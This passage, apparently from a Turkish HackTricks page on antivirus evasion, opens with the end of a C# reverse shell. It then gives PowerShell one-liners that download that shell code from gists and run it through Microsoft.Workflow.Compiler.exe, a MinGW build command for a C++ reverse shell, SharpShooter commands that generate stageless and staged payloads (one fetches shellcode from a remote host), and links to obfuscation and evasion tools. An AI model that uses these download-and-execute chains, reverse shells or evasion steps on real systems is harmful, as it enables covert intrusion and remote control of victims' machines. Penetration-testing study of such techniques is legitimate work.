p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kullanarak derleyici
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python kullanarak enjektörler oluşturma örneği:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı göndererek PR'larla** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
